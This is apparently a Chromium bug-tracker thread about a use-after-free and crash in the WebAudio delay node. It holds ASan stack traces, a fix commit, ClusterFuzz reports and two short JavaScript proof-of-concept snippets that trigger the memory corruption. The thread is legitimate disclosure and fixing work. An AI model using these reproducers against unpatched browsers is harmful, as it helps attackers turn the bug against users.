    #15 0x559b77b7dada in blink::MediaMultiChannelResampler::ProvideResamplerInput(int, media::AudioBus*) ./../../third_party/blink/renderer/platform/audio/media_multi_channel_resampler.cc:59:12
    #16 0x559b77b7e3dd in Invoke<void (blink::MediaMultiChannelResampler::*)(int, media::AudioBus *), blink::MediaMultiChannelResampler *, int, media::AudioBus *> ./../../base/functional/bind_internal.h:712:12
    #17 0x559b77b7e3dd in MakeItSo<void (blink::MediaMultiChannelResampler::*const &)(int, media::AudioBus *), const std::__Cr::tuple<base::internal::UnretainedWrapper<blink::MediaMultiChannelResampler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> > &, int, media::AudioBus *> ./../../base/functional/bind_internal.h:867:12
    #18 0x559b77b7e3dd in RunImpl<void (blink::MediaMultiChannelResampler::*const &)(int, media::AudioBus *), const std::__Cr::tuple<base::internal::UnretainedWrapper<blink::MediaMultiChannelResampler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> > &, 0UL> ./../../base/functional/bind_internal.h:967:12
    #19 0x559b77b7e3dd in base::internal::Invoker<base::internal::BindState<void (blink::MediaMultiChannelResampler::*)(int, media::AudioBus*), base::internal::UnretainedWrapper<blink::MediaMultiChannelResampler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void (int, media::AudioBus*)>::Run(base::internal::BindStateBase*, int, media::AudioBus*) ./../../base/functional/bind_internal.h:931:12
    #20 0x559b5115ee6b in base::RepeatingCallback<void (int, media::AudioBus*)>::Run(int, media::AudioBus*) const & ./../../base/functional/callback.h:348:12
    #21 0x559b511e0086 in Invoke<void (media::MultiChannelResampler::*)(int, int, float *), media::MultiChannelResampler *, const int &, int, float *> ./../../base/functional/bind_internal.h:712:12
    #22 0x559b511e0086 in MakeItSo<void (media::MultiChannelResampler::*const &)(int, int, float *), const std::__Cr::tuple<base::internal::UnretainedWrapper<media::MultiChannelResampler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, int> &, int, float *> ./../../base/functional/bind_internal.h:867:12
    #23 0x559b511e0086 in RunImpl<void (media::MultiChannelResampler::*const &)(int, int, float *), const std::__Cr::tuple<base::internal::UnretainedWrapper<media::MultiChannelResampler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, int> &, 0UL, 1UL> ./../../base/functional/bind_internal.h:967:12
    #24 0x559b511e0086 in base::internal::Invoker<base::internal::BindState<void (media::MultiChannelResampler::*)(int, int, float*), base::internal::UnretainedWrapper<media::MultiChannelResampler, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, int>, void (int, float*)>::Run(base::internal::BindStateBase*, int, float*) ./../../base/functional/bind_internal.h:931:12
    #25 0x559b5122e73b in base::RepeatingCallback<void (int, float*)>::Run(int, float*) const & ./../../base/functional/callback.h:348:12
    #26 0x559b5122e1a0 in media::SincResampler::Resample(int, float*) ./../../media/base/sinc_resampler.cc:343:14
    #27 0x559b511deba5 in media::MultiChannelResampler::Resample(int, media::AudioBus*) ./../../media/base/multi_channel_resampler.cc:77:23
    #28 0x559b77bd80c2 in blink::AudioDestination::RequestRender(unsigned long, unsigned long, double, double) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:529:19
    #29 0x559b77bd6414 in blink::AudioDestination::Render(base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, media::AudioBus*) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:202:7
    #30 0x559b7c964757 in content::RendererWebAudioDeviceImpl::Render(base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, media::AudioBus*) ./../../content/renderer/media/renderer_webaudiodevice_impl.cc:287:27
    #31 0x559b511047d9 in media::NullAudioSink::CallRender(base::TimeTicks, base::TimeTicks) ./../../media/audio/null_audio_sink.cc:118:18
    #32 0x559b511051eb in Invoke<void (media::NullAudioSink::*)(base::TimeTicks, base::TimeTicks), media::NullAudioSink *, base::TimeTicks, base::TimeTicks> ./../../base/functional/bind_internal.h:712:12
    #33 0x559b511051eb in MakeItSo<void (media::NullAudioSink::*const &)(base::TimeTicks, base::TimeTicks), const std::__Cr::tuple<base::internal::UnretainedWrapper<media::NullAudioSink, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> > &, base::TimeTicks, base::TimeTicks> ./../../base/functional/bind_internal.h:867:12
    #34 0x559b511051eb in RunImpl<void (media::NullAudioSink::*const &)(base::TimeTicks, base::TimeTicks), const std::__Cr::tuple<base::internal::UnretainedWrapper<media::NullAudioSink, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0> > &, 0UL> ./../../base/functional/bind_internal.h:967:12
    #35 0x559b511051eb in base::internal::Invoker<base::internal::BindState<void (media::NullAudioSink::*)(base::TimeTicks, base::TimeTicks), base::internal::UnretainedWrapper<media::NullAudioSink, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void (base::TimeTicks, base::TimeTicks)>::Run(base::internal::BindStateBase*, base::TimeTicks&&, base::TimeTicks&&) ./../../base/functional/bind_internal.h:931:12
    #36 0x559b511b01f1 in base::RepeatingCallback<void (base::TimeTicks, base::TimeTicks)>::Run(base::TimeTicks, base::TimeTicks) const & ./../../base/functional/callback.h:348:12
    #37 0x559b511af987 in media::FakeAudioWorker::Worker::DoRead() ./../../media/base/fake_audio_worker.cc:175:18
    #38 0x559b511b08e4 in Invoke<void (media::FakeAudioWorker::Worker::*)(), const scoped_refptr<media::FakeAudioWorker::Worker> &> ./../../base/functional/bind_internal.h:712:12
    #39 0x559b511b08e4 in MakeItSo<void (media::FakeAudioWorker::Worker::*const &)(), const std::__Cr::tuple<scoped_refptr<media::FakeAudioWorker::Worker> > &> ./../../base/functional/bind_internal.h:867:12
    #40 0x559b511b08e4 in RunImpl<void (media::FakeAudioWorker::Worker::*const &)(), const std::__Cr::tuple<scoped_refptr<media::FakeAudioWorker::Worker> > &, 0UL> ./../../base/functional/bind_internal.h:967:12
    #41 0x559b511b08e4 in base::internal::Invoker<base::internal::BindState<void (media::FakeAudioWorker::Worker::*)(), scoped_refptr<media::FakeAudioWorker::Worker>>, void ()>::Run(base::internal::BindStateBase*) ./../../base/functional/bind_internal.h:931:12
    #42 0x559b4e7e85f4 in base::RepeatingCallback<void ()>::Run() const & ./../../base/functional/callback.h:348:12
    #43 0x559b4e7e89c4 in Invoke<void (base::internal::CancelableCallbackImpl<base::RepeatingCallback<void ()> >::*)(), const base::WeakPtr<base::internal::CancelableCallbackImpl<base::RepeatingCallback<void ()> > > &> ./../../base/functional/bind_internal.h:712:12
    #44 0x559b4e7e89c4 in MakeItSo<void (base::internal::CancelableCallbackImpl<base::RepeatingCallback<void ()> >::*const &)(), const std::__Cr::tuple<base::WeakPtr<base::internal::CancelableCallbackImpl<base::RepeatingCallback<void ()> > > > &> ./../../base/functional/bind_internal.h:895:5
    #45 0x559b4e7e89c4 in RunImpl<void (base::internal::CancelableCallbackImpl<base::RepeatingCallback<void ()> >::*const &)(), const std::__Cr::tuple<base::WeakPtr<base::internal::CancelableCallbackImpl<base::RepeatingCallback<void ()> > > > &, 0UL> ./../../base/functional/bind_internal.h:967:12
    #46 0x559b4e7e89c4 in base::internal::Invoker<base::internal::BindState<void (base::internal::CancelableCallbackImpl<base::RepeatingCallback<void ()>>::*)(), base::WeakPtr<base::internal::CancelableCallbackImpl<base::RepeatingCallback<void ()>>>>, void ()>::Run(base::internal::BindStateBase*) ./../../base/functional/bind_internal.h:931:12
    #47 0x559b627c88b8 in Run ./../../base/functional/callback.h:156:12
    #48 0x559b627c88b8 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) ./../../base/task/common/task_annotator.cc:201:34
    #49 0x559b6285b3ac in RunTask<(lambda at ../../base/task/thread_pool/task_tracker.cc:645:35)> ./../../base/task/common/task_annotator.h:89:5
    #50 0x559b6285b3ac in base::internal::TaskTracker::RunTaskImpl(base::internal::Task&, base::TaskTraits const&, base::internal::TaskSource*, base::SequenceToken const&) ./../../base/task/thread_pool/task_tracker.cc:644:19
    #51 0x559b6285b67d in base::internal::TaskTracker::RunSkipOnShutdown(base::internal::Task&, base::TaskTraits const&, base::internal::TaskSource*, base::SequenceToken const&) ./../../base/task/thread_pool/task_tracker.cc:629:3
    #52 0x559b6285a5c1 in RunTaskWithShutdownBehavior ./../../base/task/thread_pool/task_tracker.cc:659:7
    #53 0x559b6285a5c1 in base::internal::TaskTracker::RunTask(base::internal::Task, base::internal::TaskSource*, base::TaskTraits const&) ./../../base/task/thread_pool/task_tracker.cc:486:5
    #54 0x559b628595ea in base::internal::TaskTracker::RunAndPopNextTask(base::internal::RegisteredTaskSource) ./../../base/task/thread_pool/task_tracker.cc:401:5
    #55 0x559b62897745 in base::internal::WorkerThread::RunWorker() ./../../base/task/thread_pool/worker_thread.cc:423:36
    #56 0x559b62896887 in base::internal::WorkerThread::RunSharedWorker() ./../../base/task/thread_pool/worker_thread.cc:318:3
    #57 0x559b6289616a in base::internal::WorkerThread::ThreadMain() ./../../base/task/thread_pool/worker_thread.cc:291:7
    #58 0x559b6291d170 in base::(anonymous namespace)::ThreadFunc(void*) ./../../base/threading/platform_thread_posix.cc:101:13
    #59 0x559b4df12348 in asan_thread_start(void*) _asan_rtl_:28

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV (/mnt/driver-1/projects/fuzzframe/gen/browser/asan-linux-release-1224701/chrome+0x38cd73aa) (BuildId: 3cd4923f59f01a24)
Thread T8 (ThreadPoolSingl) created by T0 (chrome) here:
    #0 0x559b4def9f51 in ___interceptor_pthread_create _asan_rtl_:3
    #1 0x559b6291c472 in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThreadBase::Delegate*, base::PlatformThreadHandle*, base::ThreadType, base::MessagePumpType) ./../../base/threading/platform_thread_posix.cc:146:13
    #2 0x559b62895573 in base::internal::WorkerThread::Start(scoped_refptr<base::SingleThreadTaskRunner>, base::WorkerThreadObserver*) ./../../base/task/thread_pool/worker_thread.cc:186:3
    #3 0x559b62876868 in CreateTaskRunnerImpl<base::internal::(anonymous namespace)::WorkerThreadDelegate> ./../../base/task/thread_pool/pooled_single_thread_task_runner_manager.cc:711:13
    #4 0x559b62876868 in base::internal::PooledSingleThreadTaskRunnerManager::CreateSingleThreadTaskRunner(base::TaskTraits const&, base::SingleThreadTaskRunnerThreadMode) ./../../base/task/thread_pool/pooled_single_thread_task_runner_manager.cc:650:10
    #5 0x559b7c962671 in GetSilentSinkTaskRunner ./../../content/renderer/media/renderer_webaudiodevice_impl.cc:309:32
    #6 0x559b7c962671 in content::RendererWebAudioDeviceImpl::CreateAudioRendererSink() ./../../content/renderer/media/renderer_webaudiodevice_impl.cc:342:42
    #7 0x559b7c961f19 in content::RendererWebAudioDeviceImpl::Start() ./../../content/renderer/media/renderer_webaudiodevice_impl.cc:216:5
    #8 0x559b77bd9227 in blink::AudioDestination::Start() ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:225:22
    #9 0x559b77bd09af in blink::RealtimeAudioDestinationHandler::StartPlatformDestination() ./../../third_party/blink/renderer/modules/webaudio/realtime_audio_destination_handler.cc:365:28
    #10 0x559b77a433e2 in blink::AudioContext::StartRendering() ./../../third_party/blink/renderer/modules/webaudio/audio_context.cc:555:21
    #11 0x559b77a38b54 in blink::AudioContext::Create(blink::ExecutionContext*, blink::AudioContextOptions const*, blink::ExceptionState&) ./../../third_party/blink/renderer/modules/webaudio/audio_context.cc:227:20
    #12 0x559b75b187ac in blink::(anonymous namespace)::v8_audio_context::ConstructorCallback(v8::FunctionCallbackInfo<v8::Value> const&) ./gen/third_party/blink/renderer/bindings/modules/v8/v8_audio_context.cc:239:23
    #13 0x559b5436b1ba in v8::internal::FunctionCallbackArguments::Call(v8::internal::Tagged<v8::internal::CallHandlerInfo>) ./../../v8/src/api/api-arguments-inl.h:101:3
    #14 0x559b543693e6 in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<true>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, unsigned long*, int) ./../../v8/src/builtins/builtins-api.cc:114:36
    #15 0x559b543671fe in v8::internal::Builtin_Impl_HandleApiConstruct(v8::internal::BuiltinArguments, v8::internal::Isolate*) ./../../v8/src/builtins/builtins-api.cc:145:3
    #16 0x559b58113375 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc:0:0
    #17 0x559b5807aace in construct_stub_invoke_deopt_addr setup-isolate-deserialize.cc:0:0
    #18 0x559b58203ad2 in Builtins_ConstructHandler setup-isolate-deserialize.cc:0:0
    #19 0x559b58079e7f in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc:0:0
    #20 0x559b5807791b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc:0:0
    #21 0x559b58077646 in Builtins_JSEntry setup-isolate-deserialize.cc:0:0
    #22 0x559b547562da in Call ./../../v8/src/execution/simulator.h:178:12
    #23 0x559b547562da in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) ./../../v8/src/execution/execution.cc:427:22
    #24 0x559b54755372 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*) ./../../v8/src/execution/execution.cc:528:10
    #25 0x559b54275c35 in v8::Function::Call(v8::Local<v8::Context>, v8::Local<v8::Value>, int, v8::Local<v8::Value>*) ./../../v8/src/api/api.cc:5520:7
    #26 0x559b6feb28ab in blink::V8ScriptRunner::CallFunction(v8::Local<v8::Function>, blink::ExecutionContext*, v8::Local<v8::Value>, int, v8::Local<v8::Value>*, v8::Isolate*) ./../../third_party/blink/renderer/bindings/core/v8/v8_script_runner.cc:823:17
    #27 0x559b74e0cb57 in blink::bindings::CallbackInvokeHelper<blink::CallbackFunctionWithTaskAttributionBase, (blink::bindings::CallbackInvokeHelperMode)0, (blink::bindings::CallbackReturnTypeIsPromise)0>::CallInternal(int, v8::Local<v8::Value>*) ./../../third_party/blink/renderer/bindings/core/v8/callback_invoke_helper.cc:153:12
    #28 0x559b74e0c7f3 in blink::bindings::CallbackInvokeHelper<blink::CallbackFunctionWithTaskAttributionBase, (blink::bindings::CallbackInvokeHelperMode)0, (blink::bindings::CallbackReturnTypeIsPromise)0>::Call(int, v8::Local<v8::Value>*) ./../../third_party/blink/renderer/bindings/core/v8/callback_invoke_helper.cc:174:10
    #29 0x559b767a602c in blink::V8Function::Invoke(blink::bindings::V8ValueOrScriptWrappableAdapter, blink::HeapVector<blink::ScriptValue, 0u> const&) ./gen/third_party/blink/renderer/bindings/core/v8/v8_function.cc:67:13
    #30 0x559b767a7266 in blink::V8Function::InvokeAndReportException(blink::bindings::V8ValueOrScriptWrappableAdapter, blink::HeapVector<blink::ScriptValue, 0u> const&) ./gen/third_party/blink/renderer/bindings/core/v8/v8_function.cc:122:15
    #31 0x559b78b12d8e in blink::ScheduledAction::Execute(blink::ExecutionContext*) ./../../third_party/blink/renderer/modules/scheduler/scheduled_action.cc:146:18
    #32 0x559b78b0a3cf in blink::DOMTimer::Fired() ./../../third_party/blink/renderer/modules/scheduler/dom_timer.cc:402:14
    #33 0x559b73e4d49d in blink::TimerBase::RunInternal() ./../../third_party/blink/renderer/platform/timer.cc:160:3
    #34 0x559b6fe195d4 in Invoke<void (blink::TimerBase::*)(), blink::TimerBase *> ./../../base/functional/bind_internal.h:712:12
    #35 0x559b6fe195d4 in MakeItSo<void (blink::TimerBase::*)(), std::__Cr::tuple<WTF::UnretainedWrapper<blink::TimerBase> > > ./../../base/functional/bind_internal.h:867:12
    #36 0x559b6fe195d4 in RunImpl<void (blink::TimerBase::*)(), std::__Cr::tuple<WTF::UnretainedWrapper<blink::TimerBase> >, 0UL> ./../../base/functional/bind_internal.h:967:12
    #37 0x559b6fe195d4 in base::internal::Invoker<base::internal::BindState<void (blink::TimerBase::*)(), WTF::UnretainedWrapper<blink::TimerBase>>, void ()>::RunOnce(base::internal::BindStateBase*) ./../../base/functional/bind_internal.h:918:12
    #38 0x559b627c88b8 in Run ./../../base/functional/callback.h:156:12
    #39 0x559b627c88b8 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) ./../../base/task/common/task_annotator.cc:201:34
    #40 0x559b62833aa8 in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:463:11)> ./../../base/task/common/task_annotator.h:89:5
    #41 0x559b62833aa8 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:461:23
    #42 0x559b628327ea in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:326:41
    #43 0x559b628349aa in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:0:0
    #44 0x559b62693f5f in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) ./../../base/message_loop/message_pump_default.cc:40:55
    #45 0x559b628358c0 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:626:12
    #46 0x559b62748cfc in base::RunLoop::Run(base::Location const&) ./../../base/run_loop.cc:134:14
    #47 0x559b7c9666d3 in content::RendererMain(content::MainFunctionParams) ./../../content/renderer/renderer_main.cc:366:16
    #48 0x559b5f494044 in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*) ./../../content/app/content_main_runner_impl.cc:769:14
    #49 0x559b5f497926 in content::ContentMainRunnerImpl::Run() ./../../content/app/content_main_runner_impl.cc:1140:10
    #50 0x559b5f4900fd in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) ./../../content/app/content_main.cc:334:36
    #51 0x559b5f49082f in content::ContentMain(content::ContentMainParams) ./../../content/app/content_main.cc:347:10
    #52 0x559b610d58a0 in HeadlessChildMain ./../../headless/app/headless_shell.cc:191:12
    #53 0x559b610d58a0 in headless::HeadlessShellMain(content::ContentMainParams) ./../../headless/app/headless_shell.cc:252:5
    #54 0x559b4df49b2a in ChromeMain ./../../chrome/app/chrome_main.cc:175:14
    #55 0x7fe3d2392d8f in __libc_start_call_main ./csu/../sysdeps/nptl/libc_start_call_main.h:58:16


==1300359==ADDITIONAL INFO

==1300359==Note: Please include this section with the ASan report.
Task trace:
    #0 0x559b511afb4c in media::FakeAudioWorker::Worker::DoRead() ./../../media/base/fake_audio_worker.cc:190:42
    #1 0x559b511aeb5d in media::FakeAudioWorker::Worker::Start(base::RepeatingCallback<void (base::TimeTicks, base::TimeTicks)>) ./../../media/base/fake_audio_worker.cc:125:33
    #2 0x559b78b09230 in blink::DOMTimer::DOMTimer(blink::ExecutionContext&, blink::ScheduledAction*, base::TimeDelta, bool) ./../../third_party/blink/renderer/modules/scheduler/dom_timer.cc:308:29
    #3 0x559b78b09230 in blink::DOMTimer::DOMTimer(blink::ExecutionContext&, blink::ScheduledAction*, base::TimeDelta, bool) ./../../third_party/blink/renderer/modules/scheduler/dom_timer.cc:308:29


==1300359==END OF ADDITIONAL INFO
==1300359==ABORTING

### su...@gmail.com (2023-11-29)

[Comment Deleted]

### su...@gmail.com (2023-11-29)

The stack trace for this SEGV is collected from Ubuntu. On Windows, ASan in Chrome doesn't output any stack trace to the terminal when it crashes. Has anyone encountered a similar situation? Or does anyone know why this is the case?

### gi...@appspot.gserviceaccount.com (2023-11-30)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/fb96fd5f41bec823dbb208d9a7d53fbbf4d16ce4

commit fb96fd5f41bec823dbb208d9a7d53fbbf4d16ce4
Author: Hongchan Choi <hongchan@chromium.org>
Date: Thu Nov 30 00:40:34 2023

Wrap buffer read index in delay kernel

The current code assumes that the first buffer read index in the delay
kernel does not go out of bound. This CL applies the wrapping function
to the read index array.

Bug: 1505086
Test: Locally confirmed the repro does not crash anymore
Change-Id: Idca3dfc7dec5b5a7f9b22d87135e2d775729631a
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5072113
Commit-Queue: Hongchan Choi <hongchan@chromium.org>
Reviewed-by: Michael Wilson <mjwilson@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1231040}

[modify] https://crrev.com/fb96fd5f41bec823dbb208d9a7d53fbbf4d16ce4/third_party/blink/renderer/platform/audio/delay.cc
[modify] https://crrev.com/fb96fd5f41bec823dbb208d9a7d53fbbf4d16ce4/third_party/blink/renderer/platform/audio/cpu/arm/delay_neon.cc
[modify] https://crrev.com/fb96fd5f41bec823dbb208d9a7d53fbbf4d16ce4/third_party/blink/renderer/platform/audio/cpu/x86/delay_sse2.cc


### ho...@chromium.org (2023-11-30)

The fix has landed and I'll wait for CF to verify it.

### [Deleted User] (2023-11-30)

Dear owner, thanks for fixing this bug. We’ve reopened it because security bugs need Security_Severity and FoundIn labels set, which will enable the bots to request merges to the correct branches ( as well as helping out our vulnerability reward and CVE processes). Please consult with any Chrome security contact (security@chromium.org) to arrange to set these labels and then this bug can be marked closed again. Thank you! Severity guidelines: https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md#severity-guidelines-for-security-issues FoundIn guidelines: https://chromium.googlesource.com/chromium/src/+/main/docs/security/security-labels.md#labels-relevant-for-any-type_bug_security Thanks for your time! 

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### cl...@chromium.org (2023-12-01)

Detailed Report: https://clusterfuzz.com/testcase?key=6374313112829952

Fuzzer: None
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 4
Crash Address: 0x7af066d85198
Crash State:
  blink::Delay::ProcessARateVector
  blink::Delay::ProcessARate
  blink::DelayHandler::Process
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&revision=1228878

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6374313112829952

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


************************* UNREPRODUCIBLE *************************
Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days, we've been seeing this crash frequently.

It may be possible to reproduce by trying the following options:
- Run testcase multiple times for a longer duration.
- Run fuzzing without testcase argument to hit the same crash signature.

If it still does not reproduce, try a speculative fix based on the crash stacktrace and verify if it works by looking at the crash statistics in the report. We will auto-close the bug if the crash is not seen for 14 days.
******************************************************************

### ho...@chromium.org (2023-12-01)

dcheng@

Changing the code as shown below helps the reproduction:

```js
        function poc(){
            let ctx = new AudioContext({sampleRate: 768000.0});
            let sp = ctx.createScriptProcessor();
            sp.onaudioprocess = function (event) {
                delay.delayTime.automationRate = "k-rate";
                delay.delayTime.automationRate = "a-rate";
            };

            let delay = ctx.createDelay(1);
            delay.delayTime.linearRampToValueAtTime(1, 2);
            delay.delayTime.value = -10; // this line
            sp.connect(delay).connect(ctx.destination);
        }

        setInternval(poc, 2000); // this line
```


### ho...@chromium.org (2023-12-01)

Following up on https://crbug.com/chromium/1505086#c18:

I tried to update the uploaded test case, but I don't have a permission to do it.

### ho...@chromium.org (2023-12-01)

I also see the verification against last revision was sort of successful. The patch is in 1231040:

LAST TESTED STACKTRACE ON REVISION 1231471 (1 LINES)

No crash occurred.

### cl...@chromium.org (2023-12-04)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6686121470132224.

### ho...@chromium.org (2023-12-05)

chlily@

We need to run CF with a revision before 1231040. The CF on c#21 is running the repro on 1232722, so the fix in c#14 prevents the ASAN crash from happening.

### cl...@chromium.org (2023-12-05)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6411654604980224.

### cl...@chromium.org (2023-12-05)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5778543374434304.

### ch...@chromium.org (2023-12-05)

Sorry about that! I also noticed a typo in the testcase (I reuploaded it).

### cl...@chromium.org (2023-12-05)

Testcase 6411654604980224 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=6411654604980224.

### ho...@chromium.org (2023-12-05)

Re: c#25 chlily@

https://clusterfuzz.com/testcase?key=5778543374434304 does look correct, but CF is having a hard time to reproduce it. Not sure why.

I locally confirmed that the patch fixes the ASAN crash. Please advise how we should triage this issue.

### su...@gmail.com (2023-12-05)

Could it be because the "--autoplay-policy=no-user-gesture-required" command-line parameter is not added?

### ch...@chromium.org (2023-12-05)

Since you have figured out the root cause, do you know how far back this bug goes? I think (based on https://crbug.com/chromium/1505086#c16) if you set FoundIn-{Milestone number of Stable/Beta/etc} label then you can close it as fixed. I think usually Clusterfuzz does this but maybe it's having trouble because the repro is flaky.

FoundIn guidelines: https://chromium.googlesource.com/chromium/src/+/main/docs/security/security-labels.md#labels-relevant-for-any-type_bug_security

### ho...@chromium.org (2023-12-05)

Re: c#28

I also noticed that --autoplay-policy=no-user-gesture-required is missing from ASAN command line options. chlily@ -- Can we update CF?

Re: c#29

My best guess is https://chromium-review.googlesource.com/c/chromium/src/+/2283622. We had a DCHECK on the negative index, but this CL doesn't have that check. Chromium Dash says the CL was in M86:
https://chromiumdash.appspot.com/commit/5785f8ebaa8111fe7cecc8b239c05831fb2168ce


### cl...@chromium.org (2023-12-05)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6388714714890240.

### ad...@google.com (2023-12-05)

Setting FoundIn per https://crbug.com/chromium/1505086#c30, thanks hongchan@

### [Deleted User] (2023-12-05)

[Empty comment from Monorail migration]

### cl...@chromium.org (2023-12-05)

Detailed Report: https://clusterfuzz.com/testcase?key=6388714714890240

Fuzzer: None
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Stack-use-after-return READ 4
Crash Address: 0x797a28ea79fc
Crash State:
  blink::Delay::ProcessARateVector
  blink::Delay::ProcessARate
  blink::DelayHandler::Process
  
Sanitizer: address (ASAN)

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&revision=1231037

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6388714714890240

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


************************* UNREPRODUCIBLE *************************
Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days, we've been seeing this crash frequently.

It may be possible to reproduce by trying the following options:
- Run testcase multiple times for a longer duration.
- Run fuzzing without testcase argument to hit the same crash signature.

If it still does not reproduce, try a speculative fix based on the crash stacktrace and verify if it works by looking at the crash statistics in the report. We will auto-close the bug if the crash is not seen for 14 days.
******************************************************************

### ho...@chromium.org (2023-12-05)

Hmm. For some reasons, CF is having a hard time to reproduce this whereas locally it crashes the ASAN immediately.

chlily@ - can you advise how we can proceed?

### ch...@chromium.org (2023-12-06)

Sorry, I'm not an expert here but since you already landed a fix and the root cause seems to be understood, maybe you should do what the bot said in https://crbug.com/chromium/1505086#c34:
> If it still does not reproduce, try a speculative fix based on the crash stacktrace and verify if it works by looking at the crash statistics in the report. We will auto-close the bug if the crash is not seen for 14 days.

(i.e. wait for the fix to be released and see if the crash statistics go down, and if they do the bug will be auto-closed)

### ho...@chromium.org (2023-12-06)

sunburst.chromium@

It looks like our CF can't reproduce this for some reasons. Are you able to confirm the fix with ASAN?

### [Deleted User] (2023-12-06)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### su...@gmail.com (2023-12-07)

Sure, I will test it later to confirm the fix.

### su...@gmail.com (2023-12-07)

I just test is on revision 1231040. The UAF did not trigger again. However, the issue with the SEGV mentioned earlier in https://crbug.com/chromium/1505086#c11 still exists.

- OS: Windows 10
- revision: 1231040
- gn args: is_debug=false dcheck_always_on=false is_asan=true
- commandline: chrome.exe --autoplay-policy=no-user-gesture-required

POC:

```js
function poc(){
    let ctx = new AudioContext({ sampleRate: 768000.0});
    let sp = ctx.createScriptProcessor();
    sp.onaudioprocess = function (event) {
        delay.delayTime.automationRate = "k-rate";
        delay.delayTime.automationRate = "a-rate";
    };

    let delay = ctx.createDelay(1);
    delay.delayTime.linearRampToValueAtTime(1, 2);
    delay.delayTime.value = 100;
    sp.connect(delay).connect(ctx.destination);
}
setInterval(poc, 2000);
```

Crash State:
0:015> r
rax=000012ff4188ff80 rbx=0000000000000020 rcx=000012ff41890b80
rdx=00001357cf3f7650 rsi=00001353dbe3ba60 rdi=000012e3418c81bc
rip=00007ffe01c923a0 rsp=000000d8817fdcf0 rbp=00000000000bb880
 r8=0000000000000000  r9=0000000000000000 r10=0000053329b12170
r11=0000000000000000 r12=000012ff41890b80 r13=000002d341800000
r14=000012ff4188ff80 r15=00001353dcc01800
